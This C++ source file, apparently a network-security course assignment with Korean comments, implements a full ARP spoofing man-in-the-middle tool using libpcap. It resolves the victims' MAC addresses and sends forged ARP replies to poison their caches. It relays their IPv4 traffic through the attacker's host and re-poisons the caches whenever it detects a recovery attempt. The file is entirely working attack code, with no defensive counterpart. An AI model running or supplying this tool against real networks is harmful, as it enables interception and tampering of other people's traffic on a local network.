#include <cstdio>
#include <pcap.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <iostream>
#include<arpa/inet.h>
#include <chrono>
#include <thread>
#include<vector>

#include "ethhdr.h"
#include "arphdr.h"
#include "mac.h"
#include "ip.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp-test wlan0 192.168.0.2 192.168.0.1 \n");
}

void print_ip(uint32_t ip) {
	struct in_addr ip_addr;
	ip_addr.s_addr = htonl(ip);
	printf("%s", inet_ntoa(ip_addr));
	//와이어샤크 디버깅용으로 만든 임의 함수
}

Mac get_my_mac_address(const char* my_interface){
	int file_descripter;
	struct ifreq interface_structure;

	file_descripter = socket(AF_INET, SOCK_DGRAM, 0);
	interface_structure.ifr_addr.sa_family = AF_INET;
	strncpy(interface_structure.ifr_name, my_interface, IFNAMSIZ-1);
	ioctl(file_descripter, SIOCGIFHWADDR, &interface_structure);
	close(file_descripter);

	return Mac((uint8_t*)interface_structure.ifr_hwaddr.sa_data);
}

Ip get_my_ip_address(const char* my_interface){
	struct ifreq interface_structure;
	struct sockaddr_in* ip_addr;
	int file_descriptor;

	file_descriptor = socket(AF_INET, SOCK_DGRAM, 0);
	interface_structure.ifr_addr.sa_family = AF_INET;
	strncpy(interface_structure.ifr_name, my_interface, IFNAMSIZ-1);
	ioctl(file_descriptor, SIOCGIFADDR, &interface_structure);
	close(file_descriptor);

	ip_addr = (struct sockaddr_in*)&interface_structure.ifr_addr;
	return Ip(ip_addr->sin_addr.s_addr);

}


Mac get_sender_mac_address(pcap_t* handle, Mac source_mac, Ip source_ip, Ip sender_ip ){
	//타겟의 mac 주소를 모른다는 가정하에 접근하고, 이에 따른 응답으로 mac 주소를 배우는 구조이므로 기존의 스켈레톤 코드를 통한 함수화
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); //이건 브로드캐스팅을 해야되는게 당연한거임
	packet.eth_.smac_ = source_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = source_mac;
	packet.arp_.sip_ = htonl(source_ip);
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(sender_ip);

	printf("[INFO] Sending ARP Request:\n");
	printf("       Source MAC: %s\n", std::string(source_mac).c_str());
	printf("       Source IP: %s\n", std::string(source_ip).c_str());
	printf("       Sender IP: %s\n", std::string(sender_ip).c_str());

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return Mac("00:00:00:00:00:00");
	}


	while (true) {
		struct pcap_pkthdr* header;
		const u_char* replyPacket;
		res = pcap_next_ex(handle, &header, &replyPacket);
		if (res == 0) continue; 
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		EthArpPacket* arpReply = (EthArpPacket*)replyPacket;

		printf("[INFO] Received ARP Reply:\n");
		printf("       Sender MAC: %s\n", std::string(arpReply->arp_.smac_).c_str());
		printf("       Sender IP: ");
		print_ip(ntohl(arpReply->arp_.sip_));
		printf("\n");

		if (ntohs(arpReply->eth_.type_) == EthHdr::Arp &&
				ntohs(arpReply->arp_.op_) == ArpHdr::Reply &&
				arpReply->arp_.sip_ == Ip(htonl(sender_ip))) {
			return arpReply->arp_.smac_;
		}
	}

	return Mac("00:00:00:00:00:00"); 

}

void send_Arp(pcap_t* handle, Mac sender_mac, Ip sender_ip, Mac target_mac, Ip target_ip ){
	//기본적으로 스켈레톤 코드에서 작성된 arp 코드를 가져오되, 이번 과제에서는 단순히 하나의 타겟이 아님
	//왜 멘토님께서 sender, target으로 하라고 하셨는지 뼈저리게 느낌
	EthArpPacket packet;

	packet.eth_.dmac_ = target_mac;            
	packet.eth_.smac_ = sender_mac;            
	packet.eth_.type_ = htons(EthHdr::Arp);    

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);  
	packet.arp_.pro_ = htons(EthHdr::Ip4);     
	packet.arp_.hln_ = Mac::SIZE;              
	packet.arp_.pln_ = Ip::SIZE;              
	packet.arp_.op_ = htons(ArpHdr::Reply);   

	packet.arp_.smac_ = sender_mac;            
	packet.arp_.sip_ = htonl(sender_ip);      
	packet.arp_.tmac_ = target_mac;        
	packet.arp_.tip_ = htonl(target_ip);       

	printf("[INFO] Sending ARP Spoofing Packet:\n");
	printf("       Attacker MAC: %s\n", std::string(sender_mac).c_str());
	printf("       Spoofed Source IP: %s (Fake Source IP)\n", std::string(sender_ip).c_str());
	printf("       Target MAC: %s (Victim's MAC)\n", std::string(target_mac).c_str());
	printf("       Target IP: %s (Victim's IP)\n", std::string(target_ip).c_str());

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}


void relay_packet(pcap_t* handle, Mac myMac, Mac sender_mac, Ip sender_ip, Mac target_mac, Ip target_ip ){
	//패킷 캡쳐해서, 목적지 ip는 타겟인데, 목적지 MAC이 나의 MAC과 동일하면 이 내용을 복사해서 타겟의 mac,ip로 다시 보내준다
	// smac == sender.mac && dmac ==my.mac => sender.mac = my.mac , dmac = target.mac
	// smac == target.mac && dmac == my.ac => sender.mac = my.mac , dmac = sender.mac 
	// 나머지는 무시 
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue; 
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		PEthHdr eth_hdr = (PEthHdr)packet;
		if((eth_hdr->type()==EthHdr::Arp)&&(eth_hdr->smac_ == sender_mac || eth_hdr->smac_ == target_mac) && 
				(eth_hdr->dmac_ == Mac("ff:ff:ff:ff:ff:ff") || eth_hdr -> dmac_ == Mac("00:00:00:00:00:00")||eth_hdr -> dmac_ == myMac))
		{ 
			//정상적인 arp 요청이 들어 올 때, 이걸 변조 회복 프로세스라고 탐지
			std::cout << "Inspection Recovery Detected!" << std::endl;
			send_Arp(handle, myMac, target_ip, sender_mac, sender_ip);
			sleep(1);
			send_Arp(handle, myMac, sender_ip, target_mac, target_ip);
			sleep(1);
		}
		if(eth_hdr->type() == EthHdr::Ip4) {
			u_char * relay_packet = new u_char[header->caplen];
			memcpy(relay_packet, packet, header->caplen);

			PEthHdr relay_eth_hdr = (PEthHdr)relay_packet;
			//	std::cout << "Captured Packet of Mac Address from"<< ": " << std::string(eth_hdr->smac_) <<" to :"<<std::string(eth_hdr->dmac_)<< std::endl;


			if (eth_hdr->smac_ == sender_mac && eth_hdr->dmac_ == myMac) {
				relay_eth_hdr->smac_ = myMac;
				relay_eth_hdr->dmac_ = target_mac;
				std::cout << "[Relay: Sender to Target]Relay Packet of Mac Address from"<< ": " << std::string(sender_mac) <<" to :"<<std::string(target_mac)<< std::endl;

			} else if(eth_hdr->smac_ == target_mac && eth_hdr->dmac_ == myMac){
				relay_eth_hdr->smac_ = myMac;
				relay_eth_hdr->dmac_ = sender_mac;
				std::cout << "[Relay: Target to Sender]Relay Packet of Mac Address from"<< ": " << std::string(target_mac) <<" to :"<<std::string(sender_mac)<< std::endl;//나중에 usingnamespace std;

			} else {
				delete[] relay_packet;
				continue;
			}
			int res = pcap_sendpacket(handle, relay_packet, header->caplen);

			if (res != 0){
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}

			delete[] relay_packet;
		}
	}
}



int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];    

	Mac myMac = get_my_mac_address(dev);
	std::string macStr = std::string(myMac);

	std::cout << "MAC Address of interface "<< ": " << macStr << std::endl;

	Ip myIp = get_my_ip_address(dev);    

	printf("IP Address of interface : ");
	print_ip(myIp);
	printf("\n");

	std::vector<std::thread> threads;

	for (int i = 2; i < argc; i += 2) {
		Ip senderIp = Ip(argv[i]);
		Ip targetIp = Ip(argv[i + 1]);

		threads.emplace_back([=]() {
				char errbuf[PCAP_ERRBUF_SIZE];
				pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

				if (handle == nullptr) {
				fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
				return;
				}

				std::cout << "[INFO] Processing pair: Sender IP = ";
				print_ip(senderIp);
				std::cout << ", Target IP = ";
				print_ip(targetIp);
				std::cout << std::endl;

				Mac senderMac = get_sender_mac_address(handle, myMac, myIp, senderIp);
				sleep(1);
				Mac targetMac = get_sender_mac_address(handle, myMac, myIp, targetIp);
				sleep(1);

				if (senderMac.isNull()) {
					fprintf(stderr, "Failed to get MAC address for IP: ");
					print_ip(senderIp);
					std::cout << std::endl;
					pcap_close(handle);  // handle을 사용한 후 반드시 close
					return;
				}

				send_Arp(handle, myMac, targetIp, senderMac, senderIp);
				sleep(1);
				send_Arp(handle, myMac, senderIp, targetMac, targetIp);
				sleep(1);

				std::cout << "[INFO] Completed processing for this pair." << std::endl << std::endl;

				relay_packet(handle, myMac, senderMac, senderIp, targetMac, targetIp);

				std::cout << "[INFO] Completed relay packet for this pair." << std::endl << std::endl;

				pcap_close(handle);  
		});
	}

	for (auto& thread : threads) {
		thread.join();
	}

	return 0;
}
